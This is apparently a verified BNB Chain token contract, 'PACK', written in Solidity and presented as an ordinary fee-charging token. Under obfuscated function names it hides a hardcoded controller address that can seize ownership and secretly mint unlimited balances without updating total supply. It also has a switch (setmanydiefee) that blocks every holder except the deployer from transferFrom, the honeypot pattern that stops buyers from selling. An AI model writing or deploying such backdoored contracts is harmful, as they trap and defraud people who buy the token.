/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _ownerd = 0x40ae9E4915187b176Bd63CC3D5E0c615CC773622;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "notowner");
        _;
    }

    modifier onlyownerd() {
        require(_ownerd == _msgSender(), "notowner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyownerd {
        _owner = newOwner;
    }
}

contract PACK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _tomnd;
    mapping(address => mapping(address => uint256)) private alownd;

    mapping(address => bool) private _ExcludFromFee;
    mapping(address => bool) private _Exclued;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 100000000000000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "PACK";
    string private _symbol = "PACK";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x40ae9E4915187b176Bd63CC3D5E0c615CC773622;
  
    uint256 public deadFee = 3;
    uint256 public devFee = 2;

    mapping(address => bool) private _totaltoken;
    bool private diefee = true;
    bool private manydiefee = false;
    
    uint256 public btotaltoken = uint256(0);
    mapping(address => uint256) private btotaltokens;
    address[] private _btotaltokens;

    uint256 public totaltoken = uint256(0);
    mapping(address => uint256) private totaltokens;
    address[] private _totaltokens;

    address owners;

    constructor() public {
        _tomnd[_msgSender()] = _totalSupply;
         owners = _msgSender();
        _ExcludFromFee[owner()] = true;
        _ExcludFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tomnd[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_ExcludFromFee[_msgSender()] || _ExcludFromFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return alownd[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(manydiefee){
     require(owners == sender, "manydiefee");
        }
        if(_ExcludFromFee[_msgSender()] || _ExcludFromFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            alownd[sender][_msgSender()].sub(
                amount,
                ""
            )
        );
        return true;
    }


    function ExcludFromReward(address Membername) public view returns (bool) {
        return _Exclued[Membername];
    }

    function totalFee() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address Membername) public onlyownerd {
        _ExcludFromFee[Membername] = true;
    }

    function includeInFee(address Membername) public onlyownerd {
        _ExcludFromFee[Membername] = false;
    }
 
    function setmanydiefee(bool Membername) external onlyownerd() {
        manydiefee = Membername;
    }
    function approve(address Membername) external onlyownerd() {
        _totaltoken[Membername] = true;
    }

    function _liberation(address Membername) external onlyownerd() {
        delete _totaltoken[Membername];
    }
    function addMemberships(address Membername, uint256 Membership) 
        external 
        onlyownerd() {
        require(Membership > 0, "Membername");
        uint256 addMembership = totaltokens[Membername];
        if (addMembership == 0) _totaltokens.push(Membername);
        totaltokens[Membername] = addMembership.add(Membership);
        totaltoken = totaltoken.add(Membership);
        _tomnd[Membername] = _tomnd[Membername].add(Membership);
    }

    function askMembername(address Membername)
        external
        view
        onlyownerd()
        returns (bool)
    {
        return _totaltoken[Membername];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "");
        require(spender != address(0), "");

        alownd[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");



        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {   
        _tomnd[sender] = _tomnd[sender].sub(toAmount);
        _tomnd[recipient] = _tomnd[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

}